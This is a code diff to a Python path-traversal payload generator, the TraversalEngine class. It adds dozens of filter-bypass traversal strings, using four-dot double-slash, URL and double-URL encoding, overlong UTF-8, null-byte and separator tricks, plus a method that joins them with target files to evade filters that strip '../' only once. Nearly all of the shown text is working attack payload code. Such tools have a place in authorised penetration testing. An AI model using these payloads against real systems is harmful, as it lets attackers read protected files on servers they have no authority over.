@@ -167,6 +167,53 @@ class TraversalEngine:
         "%2e%c0%ae%5c", "%2e%c0%ae%2f"
     ]
 
+    # Non-recursive bypass patterns - designed to bypass filters that remove '../' only once
+    # These patterns exploit filters that don't recursively clean up directory traversal sequences
+    NON_RECURSIVE_BYPASS_PATTERNS = [
+        # Core 4-dot double-slash patterns (main bypass technique)
+        "....//",                   # After '../' removal becomes '../'
+        ".....///",                 # 5-dot triple-slash variation
+        "......////",               # 6-dot quad-slash variation
+        
+        # Backslash variations (Windows compatibility)
+        "....\\\\",                 # 4-dot double-backslash
+        ".....\\\\\\",              # 5-dot triple-backslash
+        "......\\\\\\\\",           # 6-dot quad-backslash
+        
+        # Mixed separator patterns
+        "....//..\\\\",             # Mixed forward/backward slash
+        "..\\\\..//",               # Mixed backward/forward slash
+        
+        # URL encoded variations
+        "....%2f%2f",               # URL encoded double slash
+        "....%5c%5c",               # URL encoded double backslash
+        "....%252f%252f",           # Double URL encoded slash
+        "....%255c%255c",           # Double URL encoded backslash
+        
+        # UTF-8 overlong encoding bypass
+        "....%c0%af%c0%af",         # Overlong UTF-8 slash
+        "....%c0%5c%c0%5c",         # Overlong UTF-8 backslash
+        "....%e0%80%af%e0%80%af",   # Invalid UTF-8 slash sequence
+        
+        # Null byte injection patterns
+        "....%00//",                # Null byte + forward slash
+        "....%00\\\\",              # Null byte + backslash
+        "..%00..//",                # Embedded null byte
+        
+        # Space injection patterns
+        ".... //",                  # Space before slash
+        "..../ /",                  # Space within slash sequence
+        ".... \\\\",                # Space before backslash
+        
+        # Alternative representation patterns
+        "....?/",                   # Question mark separator
+        "....??//",                 # Double question mark
+        "....;//",                  # Semicolon separator
+        "....;;\\\\",               # Double semicolon with backslash
+        "....#/",                   # Hash separator
+        "....##//",                 # Double hash
+    ]
+
     def __init__(self, quiet: bool = False):
         """Initialize the Traversal Engine"""
         self.quiet = quiet
@@ -226,13 +273,21 @@ class TraversalEngine:
             for k in range(min_depth, max_depth + 1):
                 special_traversals.append(pattern * k)
 
+        # Add comprehensive non-recursive bypass patterns
+        if not self.quiet:
+            print("[+] Creating Non-Recursive Bypass patterns for advanced filter evasion")
+            
+        nonrecursive_traversals = self._generate_nonrecursive_bypass_traversals(max_depth)
+
         # Get target files based on OS and settings
         target_files = self._get_target_files(os_type, specific_file, extra_files)
         
         # Combine traversal strings with target files
         final_traversals = []
         
-        for traversal in traversal_strings + special_traversals:
+        all_traversals = traversal_strings + special_traversals + nonrecursive_traversals
+        
+        for traversal in all_traversals:
             for target_file in target_files:
                 # Adapt slashes based on traversal pattern
                 adapted_file = self._adapt_file_slashes(target_file, traversal)
@@ -267,6 +322,103 @@ class TraversalEngine:
             for slash in self.SLASHES:
                 patterns.append(dot + slash)
         return patterns
+
+    def _generate_nonrecursive_bypass_traversals(self, max_depth: int) -> List[str]:
+        """
+        Generate comprehensive non-recursive bypass traversal patterns.
+        
+        These patterns are specifically designed to bypass filters that only remove
+        '../' sequences once (non-recursively). After the filter removes one '../',
+        these patterns still contain traversal sequences that can be exploited.
+        
+        Examples of how they work:
+        - Filter sees: ....//....//....//
+        - Removes '../': ..//....//....//  
+        - Result still contains '../' sequences → BYPASS SUCCESS
+        
+        Args:
+            max_depth: Maximum depth for pattern repetition
+            
+        Returns:
+            List of non-recursive bypass traversal patterns
+        """
+        traversals = []
+        
+        # Core non-recursive bypass patterns with exact repetition
+        core_bypass_patterns = [
+            # Main 4-dot double-slash technique (most effective against non-recursive filters)
+            "....//....//..../",        # 3-level bypass
+            "....//....//....//...../", # 4-level bypass
+            "....//....//....//....//..../", # 5-level bypass
+            
+            # 5-dot triple-slash technique  
+            ".....///.....///.....",     # 3-level
+            ".....///.....///.....///.....", # 4-level
+            
+            # 6-dot quad-slash technique
+            "......////......////.....",  # 3-level
+            
+            # Mixed encoding for different bypass scenarios
+            "....//....%2f%2f..../",     # URL encoding mix
+            "....%2f%2f....//..../",     # Reverse URL encoding mix
+            "....%c0%af%c0%af....//..../", # UTF-8 overlong mix
+            "....//....%c0%af%c0%af..../", # Reverse UTF-8 mix
+            
+            # Backslash variations (Windows compatibility)
+            "....\\\\....\\\\....",      # Windows double-backslash
+            "....\\\\....//..../",       # Mixed slash types
+            "....//....\\\\..../",       # Mixed slash types reverse
+            
+            # Null byte injection patterns
+            "....%00//....%00//..../",   # Classic null byte bypass
+            "..%00..//..%00..//..%00..", # Embedded null bytes
+            "....%00//....//..../",      # Mixed null byte
+            
+            # Space injection patterns (often missed by regex filters)
+            ".... //.... //... /",      # Space injection
+            "..../ /..../ /..../",      # Mid-slash spaces
+            
+            # Advanced encoding combinations
+            "....%252f%252f....%252f%252f..../", # Double URL encoding
+            "....%e0%80%af%e0%80%af....//..../", # Invalid UTF-8 sequences
+            "....%c1%9c%c1%9c....//..../",       # Alternative UTF-8 encoding
+            
+            # Question mark and special character bypasses
+            "....?/....?/..../",         # Question mark separators
+            "....;;////....;;////..../", # Semicolon separators
+            
+            # High-value combination patterns
+            "....//....%00//....%2f%2f..../",    # Triple technique mix
+            "....%c0%af%c0%af....\\\\....//..../", # Multi-encoding mix
+        ]
+        
+        # Add depth-limited patterns
+        for depth in range(1, min(max_depth, 4) + 1):  # Limit to prevent payload explosion
+            for pattern in core_bypass_patterns:
+                if depth <= 3 or len(pattern) < 50:  # Size control
+                    traversals.append(pattern)
+        
+        # Add systematic NON_RECURSIVE_BYPASS_PATTERNS with controlled repetition
+        for base_pattern in self.NON_RECURSIVE_BYPASS_PATTERNS[:15]:  # Limit base patterns
+            # Create multi-level combinations
+            if max_depth >= 3:
+                three_level = f"{base_pattern}{base_pattern}{base_pattern[2:]}"  # Overlap for realism
+                traversals.append(three_level)
+                
+            if max_depth >= 4:
+                four_level = f"{base_pattern}{base_pattern}{base_pattern}{base_pattern[2:]}"
+                if len(four_level) < 60:  # Size control
+                    traversals.append(four_level)
+        
+        # Remove duplicates and empty patterns
+        unique_traversals = []
+        seen = set()
+        for traversal in traversals:
+            if traversal and traversal not in seen and len(traversal) > 5:
+                unique_traversals.append(traversal)
+                seen.add(traversal)
+        
+        return unique_traversals
 
     def _get_target_files(
         self, 
